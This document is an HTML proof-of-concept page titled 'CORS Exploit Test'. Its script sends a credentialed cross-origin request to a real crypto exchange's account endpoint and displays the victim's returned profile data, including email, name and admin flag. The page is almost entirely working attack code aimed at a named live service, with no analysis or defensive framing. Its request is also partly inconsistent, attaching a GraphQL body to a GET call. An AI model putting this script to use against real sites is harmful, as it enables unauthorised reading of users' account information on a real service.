<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CORS Exploit Test</title>
</head>
<body>
    <h1>CORS Exploit Test</h1>
    <div id="status" style="font-weight: bold; color: blue;">Sending Request...</div>
    <pre id="output" style="background: #f4f4f4; padding: 10px; border: 1px solid #ccc;"></pre>

    <script>
        const statusDiv = document.getElementById('status');
        const outputPre = document.getElementById('output');

        const targetUrl = 'https://www.deribit.com/account/BTC/me'; 

        const requestPayload = JSON.stringify({
            "operationName": "getUserInfo",
            "variables": {},
            "query": "query getUserInfo {\n  me {\n    id\n    email\n    name\n    isAdmin\n  }\n}"
        });

        const xhr = new XMLHttpRequest();
        xhr.open('GET', targetUrl, true);
        xhr.withCredentials = true;

        xhr.setRequestHeader('Content-Type', 'text/plain');

        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4) {
                statusDiv.innerText = "Response Status Code: " + xhr.status;
                if (xhr.responseText) {
                    try {
                        const jsonResponse = JSON.parse(xhr.responseText);
                        outputPre.innerText = JSON.stringify(jsonResponse, null, 2);
                    } catch (e) {
                        outputPre.innerText = xhr.responseText;
                    }
                } else {
                    outputPre.innerText = "(Response Body is Empty)";
                }
            }
        };

        xhr.onerror = function () {
            statusDiv.innerHTML = "<span style='color:red;'>Network/CORS Error! Check Console for Preflight block.</span>";
        };

        xhr.send(requestPayload);
    </script>
</body>
</html>
